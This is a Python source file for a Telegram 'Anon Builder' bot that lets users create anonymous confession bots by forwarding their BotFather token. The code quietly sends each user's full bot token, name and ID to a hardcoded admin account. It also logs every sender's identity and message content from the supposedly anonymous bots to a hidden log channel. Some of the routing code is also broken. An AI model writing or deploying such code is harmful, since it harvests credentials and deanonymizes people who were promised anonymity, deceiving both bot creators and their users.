import logging
from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Updater,
    CommandHandler,
    MessageHandler,
    Filters,
    CallbackContext,
    Dispatcher,
    CallbackQueryHandler
)
import threading
import html
import re
from flask import Flask, request, jsonify
import os
from datetime import datetime, timedelta

app = Flask(__name__)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Configuration
TOKEN = os.getenv("TELEGRAM_TOKEN")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
MAIN_ADMIN_ID = 7117744807  # Admin of the main bot
LOG_CHANNEL = 6172467461  # Channel for logging


# Simple database
user_db = {}

class AnonymousBot:
    def __init__(self, token: str, creator_id: int):
        """Initialize an anonymous messaging bot"""
        self.token = token
        self.creator_id = creator_id  # The user who created this bot becomes admin
        self.updater = Updater(token)
        self.dispatcher = self.updater.dispatcher
        self.username = self.updater.bot.get_me().username
        
        # Register handlers
        self.dispatcher.add_handler(CommandHandler("start", self.start))
        self.dispatcher.add_handler(CommandHandler("settings", self.settings))
        self.dispatcher.add_handler(CallbackQueryHandler(self.button_handler))
        self.dispatcher.add_handler(MessageHandler(Filters.all, self.message_handler))
        
        # Set webhook
        webhook_url = f"{WEBHOOK_URL}/webhook/{token}"
        self.updater.bot.set_webhook(webhook_url)
    
    def start(self, update: Update, context: CallbackContext):
        """Handle /start command"""
        user = update.effective_user
        
        # Set commands for admin
        if user.id == self.creator_id:
            context.bot.set_my_commands([
                ("start", "Mulai Bot"),
                ("settings", "Pengaturan Bot")
            ])
        
        # Send welcome message
        welcome_text = user_db.get(f'startText_{self.username}', 
                                 "Halo! Selamat datang di bot menfes anonim.")
        update.message.reply_text(welcome_text)
    
    def settings(self, update: Update, context: CallbackContext):
        """Handle /settings command (admin only)"""
        if update.effective_user.id != self.creator_id:
            update.message.reply_text("❌ Hanya admin yang bisa mengakses pengaturan.")
            return
        
        keyboard = [
            [InlineKeyboardButton("📝 Set Pesan Welcome", callback_data='st_start')],
            [InlineKeyboardButton("📩 Set Pesan Auto Reply", callback_data='st_kirim')],
            [InlineKeyboardButton("📢 Set Channel", callback_data='st_channel' if not user_db.get(f'channel_{self.username}') else 'st_anon')],
            [InlineKeyboardButton("⏱️ Set Waktu Hapus", callback_data='st_del')],
            [InlineKeyboardButton("⏸️ Set Mode Jeda", callback_data='st_jeda')],
            [InlineKeyboardButton("🔗 Set Force Sub", callback_data='st_fsub')],
            [InlineKeyboardButton("✉️ Set Mode Kirim", callback_data='mode_All')]
        ]
        
        update.message.reply_text(
            f"⚙️ <b>Pengaturan Bot @{self.username}</b>\n\nPilih opsi pengaturan:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    def button_handler(self, update: Update, context: CallbackContext):
        """Handle inline button presses"""
        query = update.callback_query
        query.answer()
        
        if query.data == 'bt_start':
            self.settings(update, context)
        elif query.data.startswith('st_'):
            self.handle_settings(query)
        elif query.data.startswith('mode_'):
            self.handle_mode_settings(query)
        elif query.data.startswith('jeda_'):
            self.handle_pause_settings(query)
        elif query.data.startswith('fsub_'):
            self.handle_fsub_settings(query)
        elif query.data.startswith('del_'):
            self.handle_delete_settings(query)
    
    def handle_settings(self, query):
        """Handle settings menu actions"""
        data = query.data
        
        if data == 'st_start':
            current_text = user_db.get(f'startText_{self.username}', 
                                     "Halo! Selamat datang di bot menfes anonim.")
            query.edit_message_text(
                f"📝 <b>Set Pesan Welcome</b>\n\nPesan saat ini:\n<code>{current_text}</code>\n\n"
                "Kirim pesan baru untuk mengganti:",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]])
            )
            user_db[f'editing_{self.username}'] = 'start_text'
        
        elif data == 'st_kirim':
            current_text = user_db.get(f'kirimText_{self.username}', "Pesan berhasil terkirim!")
            query.edit_message_text(
                f"📩 <b>Set Pesan Auto Reply</b>\n\nPesan saat ini:\n<code>{current_text}</code>\n\n"
                "Kirim pesan baru untuk mengganti:",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]])
            )
            user_db[f'editing_{self.username}'] = 'auto_reply'
        
        elif data == 'st_channel':
            query.edit_message_text(
                "📢 <b>Connect Channel</b>\n\n"
                "1. Tambahkan @{self.username} ke channel Anda sebagai admin\n"
                "2. Kirim /setchanneluser di channel Anda\n"
                "3. Teruskan pesan tersebut ke bot ini",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]])
            )
            user_db[f'editing_{self.username}'] = 'connect_channel'
        
        elif data == 'st_anon':
            channel_id = user_db.get(f'channel_{self.username}')
            query.edit_message_text(
                f"📢 <b>Channel Settings</b>\n\nTerhubung dengan channel ID: <code>{channel_id}</code>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("❌ Putuskan Channel", callback_data='st_putus')],
                    [InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]
                ])
            )
        
        elif data == 'st_putus':
            user_db.pop(f'channel_{self.username}', None)
            query.edit_message_text(
                "✅ Channel berhasil diputuskan",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]])
            )
    
    def message_handler(self, update: Update, context: CallbackContext):
        """Handle all incoming messages"""
        message = update.message
        
        # Check if bot is paused
        if user_db.get(f'jeda_{self.username}') == 'iya':
            update.message.reply_text("⏸️ <b>Bot sedang dijeda</b>\n\nAnda tidak bisa mengirim pesan sekarang.",
                                    parse_mode='HTML')
            return
        
        # Check if admin is editing settings
        if update.effective_user.id == self.creator_id:
            if user_db.get(f'editing_{self.username}') == 'start_text':
                user_db[f'startText_{self.username}'] = message.text
                user_db.pop(f'editing_{self.username}', None)
                update.message.reply_text("✅ Pesan welcome berhasil diupdate!")
                return
            
            elif user_db.get(f'editing_{self.username}') == 'auto_reply':
                user_db[f'kirimText_{self.username}'] = message.text
                user_db.pop(f'editing_{self.username}', None)
                update.message.reply_text("✅ Pesan auto reply berhasil diupdate!")
                return
            
            elif user_db.get(f'editing_{self.username}') == 'connect_channel' and message.forward_from_chat:
                if message.forward_from_chat.type == 'channel':
                    user_db[f'channel_{self.username}'] = str(message.forward_from_chat.id)
                    user_db.pop(f'editing_{self.username}', None)
                    update.message.reply_text("✅ Channel berhasil terhubung!")
                    return
        
        # Handle regular messages
        channel_id = user_db.get(f'channel_{self.username}', str(MAIN_ADMIN_ID))
        
        # Check force subscription
        if user_db.get(f'fsub_{self.username}') == 'iya' and channel_id:
            try:
                member = context.bot.get_chat_member(channel_id, update.effective_user.id)
                if member.status in ['left', 'kicked']:
                    keyboard = [[InlineKeyboardButton("Join Channel", url=f"https://t.me/{self.username}")]]
                    update.message.reply_text(
                        "🔗 <b>Anda harus join channel dulu</b>\n\nSetelah join, ketik /start lagi",
                        parse_mode='HTML',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return
            except Exception as e:
                logger.error(f"Error checking channel membership: {e}")
        
        # Process different message types
        if message.photo:
            self.handle_photo(update, context, channel_id)
        elif message.sticker:
            self.handle_sticker(update, context, channel_id)
        elif message.document:
            self.handle_document(update, context, channel_id)
        elif message.text and not message.text.startswith(('/start', '/settings')):
            self.handle_text(update, context, channel_id)
    
    def handle_photo(self, update: Update, context: CallbackContext, channel_id: str):
        """Handle photo messages"""
        if user_db.get(f'modeFoto_{self.username}'):
            return
        
        caption = update.message.caption or ""
        sent_message = context.bot.send_photo(
            chat_id=channel_id,
            photo=update.message.photo[-1].file_id,
            caption=caption,
            has_spoiler=True
        )
        
        # Send confirmation
        reply_text = user_db.get(f'kirimText_{self.username}', "✅ Pesan berhasil terkirim!")
        update.message.reply_text(reply_text)
        
        # Log the message
        self.log_message(update, "Photo", caption)
        
        # Auto-delete if enabled
        self.auto_delete(channel_id, sent_message.message_id)
    
    def handle_sticker(self, update: Update, context: CallbackContext, channel_id: str):
        """Handle sticker messages"""
        if user_db.get(f'modeSticker_{self.username}'):
            return
        
        context.bot.send_sticker(
            chat_id=channel_id,
            sticker=update.message.sticker.file_id
        )
        
        # Send confirmation
        reply_text = user_db.get(f'kirimText_{self.username}', "✅ Pesan berhasil terkirim!")
        update.message.reply_text(reply_text)
        
        # Log the message
        self.log_message(update, "Sticker")
    
    def handle_document(self, update: Update, context: CallbackContext, channel_id: str):
        """Handle document messages"""
        if user_db.get(f'modeBerkas_{self.username}'):
            return
        
        sent_message = context.bot.send_document(
            chat_id=channel_id,
            document=update.message.document.file_id
        )
        
        # Send confirmation
        reply_text = user_db.get(f'kirimText_{self.username}', "✅ Pesan berhasil terkirim!")
        update.message.reply_text(reply_text)
        
        # Log the message
        self.log_message(update, "Document")
        
        # Auto-delete if enabled
        self.auto_delete(channel_id, sent_message.message_id)
    
    def handle_text(self, update: Update, context: CallbackContext, channel_id: str):
        """Handle text messages"""
        if user_db.get(f'modeText_{self.username}'):
            return
        
        context.bot.send_message(
            chat_id=channel_id,
            text=update.message.text
        )
        
        # Send confirmation
        reply_text = user_db.get(f'kirimText_{self.username}', "✅ Pesan berhasil terkirim!")
        update.message.reply_text(reply_text)
        
        # Log the message
        self.log_message(update, "Text", update.message.text)
    
    def log_message(self, update: Update, msg_type: str, caption: str = ""):
        """Log messages to channels"""
        user = update.effective_user
        name = user.first_name
        if user.last_name:
            name += f" {user.last_name}"
        
        log_text = f"📩 <b>New {msg_type}</b>\n"
        log_text += f"👤 <b>From:</b> {name} (<code>{user.id}</code>)\n"
        log_text += f"🤖 <b>Bot:</b> @{self.username}\n"
        if caption:
            log_text += f"\n{caption}"
        
        # Send to log channels
        for channel in [LOG_CHANNEL]:
            try:
                if msg_type == "Photo":
                    self.updater.bot.send_photo(
                        chat_id=channel,
                        photo=update.message.photo[-1].file_id,
                        caption=log_text,
                        parse_mode='HTML'
                    )
                elif msg_type == "Document":
                    self.updater.bot.send_document(
                        chat_id=channel,
                        document=update.message.document.file_id,
                        caption=log_text,
                        parse_mode='HTML'
                    )
                else:
                    self.updater.bot.send_message(
                        chat_id=channel,
                        text=log_text,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"Failed to log message: {e}")
    
    def auto_delete(self, chat_id: str, message_id: int):
        """Auto-delete message after delay if enabled"""
        delay = user_db.get(f'del_{self.username}')
        if not delay:
            return
        
        try:
            # Convert delay from milliseconds to seconds
            delay_seconds = int(delay) / 1000
            
            def delete_message():
                try:
                    self.updater.bot.delete_message(chat_id, message_id)
                except Exception as e:
                    logger.error(f"Failed to auto-delete message: {e}")
            
            # Schedule deletion
            self.updater.job_queue.run_once(
                lambda _: delete_message(),
                delay_seconds
            )
        except Exception as e:
            logger.error(f"Error scheduling auto-delete: {e}")

class BotManager:
    """Manager for creating and managing anonymous bots"""
    def __init__(self):
        self.active_bots = {}  # {user_id: bot_instance}
        self.main_bot = None
    
    def set_main_bot(self, bot: Bot, dispatcher: Dispatcher):
        """Set the main builder bot"""
        self.main_bot = {
            'bot': bot,
            'dispatcher': dispatcher
        }
    
    def create_bot(self, token: str, creator_id: int):
        """Create a new anonymous bot"""
        if creator_id in self.active_bots:
            return False, "Anda sudah memiliki bot aktif"
        
        try:
            # Validate token
            if not re.match(r'^\d{9,10}:[a-zA-Z0-9_-]{35}$', token):
                return False, "Format token tidak valid"
            
            # Create and start the bot
            bot = AnonymousBot(token, creator_id)
            self.active_bots[creator_id] = bot
            
            return True, f"✅ Bot berhasil dibuat!\n\nUsername: @{bot.username}"
        except Exception as e:
            logger.error(f"Failed to create bot: {e}")
            return False, f"❌ Gagal membuat bot: {str(e)}"

# Initialize bot manager
bot_manager = BotManager()

# Main bot handlers
def start(update: Update, context: CallbackContext):
    """Handle /start command for main bot"""
    user = update.effective_user
    name = user.first_name
    if user.last_name:
        name += f" {user.last_name}"
    
    message = (
        f"Halo <b>{html.escape(name)}</b>! 👋\n\n"
        "Saya adalah Anon Builder yang membantu Anda membuat bot menfes anonim "
        "tanpa perlu server sendiri.\n\n"
        "Silakan pilih opsi di bawah ini:"
    )
    
    keyboard = [
        [InlineKeyboardButton("📝 Tentang", callback_data='bt_about')],
        [
            InlineKeyboardButton("🆘 Bantuan", callback_data='bt_admin'),
            InlineKeyboardButton("🤖 Buat Bot", callback_data='bt_build')
        ],
        [InlineKeyboardButton("💬 Support", callback_data='bt_sp')]
    ]
    
    if update.message:
        update.message.reply_html(
            message,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        update.callback_query.edit_message_text(
            message,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

def handle_forwarded_message(update: Update, context: CallbackContext):
    """Handler untuk pesan yang diteruskan dari BotFather"""
    if (update.message.forward_from and 
        str(update.message.forward_from.id) == '93372553'):
        
        chat_id = update.effective_chat.id
        buatbot = user_db.get(f'addbot_{chat_id}')
        
        if buatbot:
            user = update.effective_user
            nama = user.first_name
            if user.last_name:
                nama += ' ' + user.last_name
            
            nama = html.escape(nama)
            dari = chat_id
            idnama = f'<a href="tg://user?id={dari}">{nama}</a>'
            
            # Kirim notifikasi ke admin
            context.bot.send_message(
                chat_id=MAIN_ADMIN_ID,
                text=f"<b>Permintaan Bot Baru</b>\n"
                     f"<b>User:</b> {idnama}\n"
                     f"<b>ID:</b> {dari}\n"
                     f"<b>Token:</b> <code>{update.message.text}</code>",
                parse_mode='HTML',
                disable_web_page_preview=True
            )
            
            # Hapus status pembuatan bot
            user_db.pop(f'addbot_{chat_id}', None)
            
            # Ekstrak token dari pesan
            token = re.search(r'\d{9,10}:[a-zA-Z0-9_-]{35}', update.message.text)
            if token:
                token = token.group(0)
                # Buat bot baru
                success, message = bot_manager.create_bot(token, user.id)
                update.message.reply_html(
                    f"<i>🔄 Sedang membuat bot...</i>\n\n"
                    f"{message}",
                    reply_to_message_id=update.message.message_id
                )
            else:
                update.message.reply_text(
                    "❌ Token tidak ditemukan dalam pesan. Pastikan Anda meneruskan pesan lengkap dari @BotFather",
                    reply_to_message_id=update.message.message_id
                )


def button_handler(update: Update, context: CallbackContext):
    """Handle inline button presses for main bot"""
    query = update.callback_query
    query.answer()
    
    if query.data == 'bt_build':
        # Set flag that user wants to create a bot
        user_db[f'addbot_{query.message.chat.id}'] = True
        
        # Send instructions
        instructions = (
            "📝 <b>Panduan Membuat Bot</b>\n\n"
            "1. Buka @BotFather dan kirim /newbot\n"
            "2. Ikuti instruksi untuk membuat bot baru\n"
            "3. Setelah mendapatkan token, <b>teruskan pesan lengkap dari @BotFather</b> ke saya"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]
        ]
        
        query.edit_message_text(
            instructions,
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == 'bt_about':
        about_text = (
            "🤖 <b>Tentang Anon Builder Bot</b>\n\n"
            "Anon Builder adalah solusi mudah untuk membuat bot menfes Telegram tanpa perlu:\n"
            "- Server pribadi\n"
            "- Pengetahuan pemrograman\n"
            "- Konfigurasi rumit\n\n"
            "Dengan beberapa klik, Anda bisa memiliki bot menfes sendiri!"
        )
        keyboard = [[InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]]
        query.edit_message_text(about_text, parse_mode='HTML', reply_markup=InlineKeyboardMarkup(keyboard))
    
    elif query.data == 'bt_admin':
        keyboard = [
            [
                InlineKeyboardButton("👮 Admin 1", url="tg://user?id=1910497806"),
                InlineKeyboardButton("👮 Admin 2", url="tg://user?id=6013163225")
            ],
            [InlineKeyboardButton("🔙 Kembali", callback_data='bt_start')]
        ]
        query.edit_message_text(
            "<b>📞 Kontak Admin</b>\n\nHubungi admin jika Anda membutuhkan bantuan:",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == 'bt_sp':
        user_db[f'support_{query.message.chat.id}'] = True
        keyboard = [[InlineKeyboardButton("❌ Batalkan", callback_data='bt_cancel')]]
        query.edit_message_text(
            "💬 <b>Mode Support</b>\n\nSilakan kirim pesan Anda untuk admin support...",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == 'bt_cancel':
        user_db.pop(f'support_{query.message.chat.id}', None)
        query.delete_message()
        context.bot.send_message(
            chat_id=query.message.chat.id,
            text="❌ Permintaan dibatalkan"
        )
    
    elif query.data == 'bt_start':
        start(update, context)

# Flask routes
@app.route('/')
def home():
    return "Anon Builder Bot is running!"

@app.route('/webhook', methods=['POST'])
def webhook():
    """Webhook for main bot"""
    if not bot_manager.main_bot:
        return jsonify(success=False, error="Main bot not initialized"), 500
        
    update = Update.de_json(request.get_json(), bot_manager.main_bot['bot'])
    bot_manager.main_bot['dispatcher'].process_update(update)
    return jsonify(success=True)

@app.route('/webhook/<token>', methods=['POST'])
def bot_webhook(token):
    """Webhook for created bots"""
    for user_id, bot_data in bot_manager.active_bots.items():
        if isinstance(bot_data, dict) and bot_data.get('token') == token:
            update = Update.de_json(request.get_json(), bot_data['bot'])
            bot_data['dispatcher'].process_update(update)
            return jsonify(success=True)
    return jsonify(success=False, error="Bot not found"), 404

def setup_telegram_bot():
    """Setup the main bot"""
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    
    # Register handlers
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(
        Filters.forwarded & Filters.chat_type.private,
        handle_forwarded_message
    ))
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    # Set webhook
    webhook_url = f"{WEBHOOK_URL}/webhook"
    updater.bot.set_webhook(webhook_url)
    logger.info(f"Main bot webhook set to: {webhook_url}")
    
    # Save main bot reference
    bot_manager.set_main_bot(updater.bot, dp)
    
    return updater

if __name__ == '__main__':
    # Start the main bot
    main_bot = setup_telegram_bot()
    
    # Start Flask app
    app.run(host='0.0.0.0', port=8000)
